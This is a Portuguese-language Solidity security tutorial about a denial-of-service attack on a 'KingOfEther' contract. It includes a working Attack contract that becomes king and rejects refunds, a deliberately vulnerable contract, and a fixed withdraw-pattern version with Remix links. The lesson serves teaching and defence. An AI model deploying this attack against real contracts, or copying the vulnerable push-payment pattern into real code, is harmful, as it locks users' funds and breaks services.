# Recusa de Serviço

</h4><a href="#vulnerability" id="vulnerability">Vulnerabilidade</a></h4>

Existem várias formas de invadir um contrato inteligente para torná-lo inutilizável.

Uma exploração que introduzimos aqui é a negação de serviço, fazendo com que a função de enviar Ether falhe.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
A meta do KingOfEther é se tornar o rei enviando mais Ether que o rei anterior
O rei anterior receberá a quantia de Ether que ele havia enviado
*/

/*
1. Implemente KingOfEther
2. Alice se torna o rei enviando 1 Ether para claimThrone().
2. Bob se torna o rei enviando 2 Ether para claimThrone().
   Alice recebe o reembolso de 1 Ether.
3. Implemente Attack com endereço do KingOfEther.
4. Chame attack com 3 Ether.
5. O rei atual é o contrato Attack e ninguém mais pode se tornar o rei.

O que aconteceu?
Attack se tornou o rei. Todas as novas tentativas de clamar pelo trono são
rejeitadas já que o contrato Attack não tem uma função fallback, recusando
aceitar Ether enviado de KingOfEther, antes que o novo rei seja definido.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    // Você também pode executar um DOS consumindo todo o gás usando assert.
    // Essa invasão vai funcionar mesmo que o contrato de chamada não confira
    // se a chamada foi bem sucedida ou não.
    //
    // function () external payable {
    //     assert(false);
    // }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}
```

</h4><a href="#preventative-techniques" id="preventative-techniques">Técnicas preventivas</a></h4>

Uma forma de evitar isso é permitir que os usuários retirem seu Ether ao invés de enviá-lo.

Aqui está um exemplo.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

## Teste no Remix

- [DenialOfService.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8qCkEgbWV0YSBkbyBLaW5nT2ZFdGhlciBlIHNlIHRvcm5hciBvIHJlaSBlbnZpYW5kbyBtYWlzIEV0aGVyIHF1ZSBvIHJlaSBhbnRlcmlvcgpPIHJlaSBhbnRlcmlvciByZWNlYmVyYSBhIHF1YW50aWEgZGUgRXRoZXIgcXVlIGVsZSBoYXZpYSBlbnZpYWRvCiovCgovKgoxLiBJbXBsZW1lbnRlIEtpbmdPZkV0aGVyCjIuIEFsaWNlIHNlIHRvcm5hIG8gcmVpIGVudmlhbmRvIDEgRXRoZXIgcGFyYSBjbGFpbVRocm9uZSgpLgoyLiBCb2Igc2UgdG9ybmEgbyByZWkgZW52aWFuZG8gMiBFdGhlciBwYXJhIGNsYWltVGhyb25lKCkuCiAgIEFsaWNlIHJlY2ViZSBvIHJlZW1ib2xzbyBkZSAxIEV0aGVyLgozLiBJbXBsZW1lbnRlIEF0dGFjayBjb20gZW5kZXJlY28gZG8gS2luZ09mRXRoZXIuCjQuIENoYW1lIGF0dGFjayBjb20gMyBFdGhlci4KNS4gTyByZWkgYXR1YWwgZSBvIGNvbnRyYXRvIEF0dGFjayBlIG5pbmd1ZW0gbWFpcyBwb2RlIHNlIHRvcm5hciBvIHJlaS4KCk8gcXVlIGFjb250ZWNldT8KQXR0YWNrIHNlIHRvcm5vdSBvIHJlaS4gVG9kYXMgYXMgbm92YXMgdGVudGF0aXZhcyBkZSBjbGFtYXIgcGVsbyB0cm9ubyBzYW8KcmVqZWl0YWRhcyBqYSBxdWUgbyBjb250cmF0byBBdHRhY2sgbmFvIHRlbSB1bWEgZnVuY2FvIGZhbGxiYWNrLCByZWN1c2FuZG8KYWNlaXRhciBFdGhlciBlbnZpYWRvIGRlIEtpbmdPZkV0aGVyLCBhbnRlcyBxdWUgbyBub3ZvIHJlaSBzZWphIGRlZmluaWRvLgoqLwoKY29udHJhY3QgS2luZ09mRXRoZXIgewogICAgYWRkcmVzcyBwdWJsaWMga2luZzsKICAgIHVpbnQgcHVibGljIGJhbGFuY2U7CgogICAgZnVuY3Rpb24gY2xhaW1UaHJvbmUoKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA+IGJhbGFuY2UsICJOZWVkIHRvIHBheSBtb3JlIHRvIGJlY29tZSB0aGUga2luZyIpOwoKICAgICAgICAoYm9vbCBzZW50LCApID0ga2luZy5jYWxse3ZhbHVlOiBiYWxhbmNlfSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKCiAgICAgICAgYmFsYW5jZSA9IG1zZy52YWx1ZTsKICAgICAgICBraW5nID0gbXNnLnNlbmRlcjsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIEtpbmdPZkV0aGVyIGtpbmdPZkV0aGVyOwoKICAgIGNvbnN0cnVjdG9yKEtpbmdPZkV0aGVyIF9raW5nT2ZFdGhlcikgewogICAgICAgIGtpbmdPZkV0aGVyID0gS2luZ09mRXRoZXIoX2tpbmdPZkV0aGVyKTsKICAgIH0KCiAgICAvLyBWb2NlIHRhbWJlbSBwb2RlIGV4ZWN1dGFyIHVtIERPUyBjb25zdW1pbmRvIHRvZG8gbyBnYXMgdXNhbmRvIGFzc2VydC4KICAgIC8vIEVzc2EgaW52YXNhbyB2YWkgZnVuY2lvbmFyIG1lc21vIHF1ZSBvIGNvbnRyYXRvIGRlIGNoYW1hZGEgbmFvIGNvbmZpcmEKICAgIC8vIHNlIGEgY2hhbWFkYSBmb2kgYmVtIHN1Y2VkaWRhIG91IG5hby4KICAgIC8vCiAgICAvLyBmdW5jdGlvbiAoKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgIC8vICAgICBhc3NlcnQoZmFsc2UpOwogICAgLy8gfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICBraW5nT2ZFdGhlci5jbGFpbVRocm9uZXt2YWx1ZTogbXNnLnZhbHVlfSgpOwogICAgfQp9&version=soljson-v0.8.13+commit.abaa5c0e.js)
- [PreventDenialOfService.sol](https://remix.ethereum.org/#code=Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCmNvbnRyYWN0IEtpbmdPZkV0aGVyIHsKICAgIGFkZHJlc3MgcHVibGljIGtpbmc7CiAgICB1aW50IHB1YmxpYyBiYWxhbmNlOwogICAgbWFwcGluZyhhZGRyZXNzID0+IHVpbnQpIHB1YmxpYyBiYWxhbmNlczsKCiAgICBmdW5jdGlvbiBjbGFpbVRocm9uZSgpIGV4dGVybmFsIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID4gYmFsYW5jZSwgIk5lZWQgdG8gcGF5IG1vcmUgdG8gYmVjb21lIHRoZSBraW5nIik7CgogICAgICAgIGJhbGFuY2VzW2tpbmddICs9IGJhbGFuY2U7CgogICAgICAgIGJhbGFuY2UgPSBtc2cudmFsdWU7CiAgICAgICAga2luZyA9IG1zZy5zZW5kZXI7CiAgICB9CgogICAgZnVuY3Rpb24gd2l0aGRyYXcoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUobXNnLnNlbmRlciAhPSBraW5nLCAiQ3VycmVudCBraW5nIGNhbm5vdCB3aXRoZHJhdyIpOwoKICAgICAgICB1aW50IGFtb3VudCA9IGJhbGFuY2VzW21zZy5zZW5kZXJdOwogICAgICAgIGJhbGFuY2VzW21zZy5zZW5kZXJdID0gMDsKCiAgICAgICAgKGJvb2wgc2VudCwgKSA9IG1zZy5zZW5kZXIuY2FsbHt2YWx1ZTogYW1vdW50fSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQ==&version=soljson-v0.8.13+commit.abaa5c0e.js)
